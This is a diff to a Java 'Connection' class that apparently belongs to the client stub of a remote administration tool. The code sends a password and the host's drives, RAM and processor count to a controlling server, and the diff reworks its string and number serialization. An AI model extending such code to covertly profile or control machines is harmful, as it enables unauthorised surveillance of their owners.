@@ -20,8 +20,8 @@ import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.common.Version;
 import com.redpois0n.common.codec.Hex;
 import com.redpois0n.common.crypto.Crypto;
-import com.redpois0n.packets.Header;
 import com.redpois0n.packets.AbstractPacket;
+import com.redpois0n.packets.Header;
 import com.redpois0n.packets.PacketBuilder;
 import com.sun.management.OperatingSystemMXBean;
 
@@ -64,7 +64,7 @@ public class Connection implements Runnable {
 			
 			Main.encryption = inputStream.read() == 1;
 			
-			addToSendQueue(new PacketBuilder(Header.INIT_PASSWORD, Main.getPass()));
+			addToSendQueue(new PacketBuilder(Header.INIT_PASSWORD, Main.getPass()));		
 
 			initialize();
 
@@ -75,14 +75,10 @@ public class Connection implements Runnable {
 			}
 			
 			while (true) {
-				short line = (short) readInt();
-
-				if (line == -1) {
-					throw new NullPointerException();
-				}
+				byte line = readByte();
 				
 				if (line == 0) {
-					Connection.writeInt(0);
+					Connection.writeByte(0);
 					continue;
 				}
 
@@ -148,7 +144,7 @@ public class Connection implements Runnable {
 		}
 		addToSendQueue(drives);
 
-		addToSendQueue(new PacketBuilder(Header.INIT_RAM, "" + (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
+		addToSendQueue(new PacketBuilder(Header.INIT_RAM, (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L)));
 
 		addToSendQueue(new PacketBuilder(Header.INIT_AVAILABLE_PROCESSORS, Runtime.getRuntime().availableProcessors() + ""));
 
@@ -193,9 +189,9 @@ public class Connection implements Runnable {
 				enc = "-c " + s;
 			}
 			
-			dos.writeUTF(enc);
-			//dos.writeShort(enc.length());
-			//dos.writeChars(enc);
+			//dos.writeUTF(enc);
+			dos.writeShort(enc.length());
+			dos.writeChars(enc);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
@@ -203,15 +199,15 @@ public class Connection implements Runnable {
 
 	public static String readLine() {
 		try {
-			String s = dis.readUTF();
-			/*short len = dis.readShort();
+			//String s = dis.readUTF();
+			short len = dis.readShort();
 			
 			StringBuilder builder = new StringBuilder();
 			for (int i = 0; i < len; i++) {
 				builder.append(dis.readChar());
 			}
 			
-			String s = builder.toString();*/
+			String s = builder.toString();
 			
 			if (s.startsWith("-h ")) {
 				s = Hex.decode(s.substring(3, s.length()));
@@ -228,33 +224,94 @@ public class Connection implements Runnable {
 		}
 	}
 	
-	public static void writeBoolean(boolean b) throws Exception {
-		writeLine(Boolean.toString(b));
+	public static void writeShort(int i) throws Exception {
+		if (true) {
+			writeLine(i);
+		} else {
+			dos.writeShort(i);
+
+		}
+	}
+	
+	public static short readShort() throws Exception {
+		if (true) {
+			return Short.parseShort(readLine());
+		} else {
+			return dis.readShort();
+
+		}
+	}
+	
+	public static byte readByte() throws Exception {
+		if (true) {
+			return Byte.parseByte(readLine());
+		} else {
+			return dis.readByte();
+
+		}
+	}
+	
+	public static void writeByte(int b) throws Exception {
+		if (true) {
+			writeLine(b);
+		} else {
+			dos.writeByte(b);
+
+		}
 	}
 	
 	public static boolean readBoolean() throws Exception {
-		return Boolean.parseBoolean(readLine());
+		if (true) {
+			return readLine().equalsIgnoreCase("true");
+		} else {
+			return dis.readBoolean();
+
+		}
 	}
 	
-	
-	public static void writeInt(int v) throws Exception {
-		writeLine(Integer.toString(v));
+	public static void writeBoolean(boolean b) throws Exception {
+		if (true) {
+			writeLine(b);
+		} else {
+			dos.writeBoolean(b);
+
+		}
 	}
 	
 	public static int readInt() throws Exception {
-		return Integer.parseInt(readLine());
+		if (true) {
+			return Integer.parseInt(readLine());
+		} else {
+			return dis.readInt();		
+
+		}
 	}
 	
+	public static void writeInt(int i) throws Exception {
+		if (true) {
+			writeLine(i);
+		} else {
+			dos.writeInt(i);
+
+		}
+	}
+	
+	public static long readLong() throws Exception {	
+		if (true) {
+			return Long.parseLong(readLine());
+		} else {
+			return dis.readLong();
+		}
+	}
 	
 	public static void writeLong(long l) throws Exception {
-		writeLine(Long.toString(l));
+		if (true) {
+			writeLine(l);
+		} else {
+			dos.writeLong(l);
+		}
 	}
-	
-	public static long readLong() throws Exception {
-		return Long.parseLong(readLine());
-	}
-	
-	
+
 	public static void writeLine(Object obj) throws Exception {
 		writeLine(obj.toString());
 	}
